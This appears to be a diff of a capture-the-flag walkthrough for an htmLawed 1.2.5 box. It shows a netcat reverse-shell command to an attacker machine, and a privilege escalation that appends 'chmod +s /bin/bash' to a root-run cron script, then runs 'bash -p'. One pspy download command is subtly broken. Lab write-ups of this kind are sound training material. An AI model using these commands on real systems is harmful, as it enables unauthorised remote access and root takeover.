@@ -45,9 +45,83 @@ It seems like an HTMLawed 1.2.5 test version. There appears to be an exploit for
 To reproduce the exploit I did the following :
 launched burp suite.
 Checking the browser network tab, we discovered the POST request sent to `[http://$ip/htmLawedTest.php](http://$ip/htmLawedTest.php)` where our page is supposed to be `[http://$ip](http://$ip./)` , to ease up the thing, we decide to use burp to intercept the traffic, and correct the POST request.
-![[Pasted image 20260310164235.png]]
+![](Images/Law4.png)
 Remove the htmLawedTest.php and click forward.
-![[Pasted image 20260310164407.png]]
-![[Pasted image 20260310164423.png]]
+![](Images/Law5.png)
+![](Images/Law6.png)
 And here we go, setup a netcat listener on our kali machine and execute `nc $kaliIP 80 -e /bin/sh` on the target machine to get us a reverse shell. Sometimes the page just does not work, try refresh and it should work.
-![[Pasted image 20260310164645.png]]
+![](Images/Law8.png)
+![](Images/Law9.png)
+
+![](Images/Law7.png)
+![](Images/Law10.png)
+
+### Privilege Escalation
+We tried checking for sudo, SUID and crontab but found nothing, so we decided to run pspy.
+Let it run for a while and observe the result, this tool helps us to monitor the running process recursively.
+From the result, you will notice UID=0 means root, execute the cleanup.sh. Since we have the read-write permission of the cleanup.sh, we are able to put malicious commands to the file and let root do the job.
+```sh
+#At kali machine  
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+chmod +x pspy64
+python3 -m http.server 80  
+#at target machine  
+curl http://$kaliIP/pspy64 -o /tmp 
+chmod +x /tmp 
+./pspy64
+```
+
+![](Images/Law11.png)
+Important observations:
+
+|Field|Meaning|
+|---|---|
+|`UID=0`|Running as **root**|
+|`/usr/sbin/CRON`|Triggered by **cron job**|
+|`/var/www/cleanup.sh`|Script executed by root|
+To check permissions.
+![](Images/Law12.png)
+This means:
+
+|Permission|Meaning|
+|---|---|
+|Owner|`www-data`|
+|Writable by|**www-data**|
+|Executed by|root|
+We checked that /bin/bash is owned by root.
+![](Images/Law13.png)
+So we did below modifications to the `cleanup.sh`
+`echo "chmod +s /bin/bash" >> cleanup.sh`
+
+`chmod +s` sets the **SUID (Set User ID) bit**.
+
+The **SUID permission** means:
+
+> When a file is executed, it runs with the **file owner's privileges**, not the user's.
+
+Since `/bin/bash` is owned by **root**, it will execute as **root**.
+
+We checked if SUID is set or not. (s is added)
+![](Images/Law14.png)
+
+Now simply run the `bash -p`
+If a **SUID bash** is executed normally:
+`bash`
+Bash will **drop root privileges** automatically to prevent exploitation.
+```
+$ bash  
+$ whoami  
+www-data
+```
+# What `-p` Does
+
+The `-p` flag means:
+
+-p  → preserve privileges
+
+So when you run:
+
+`bash -p`
+
+Bash **keeps the SUID privileges instead of dropping them**.
+![](Images/Law5.png)
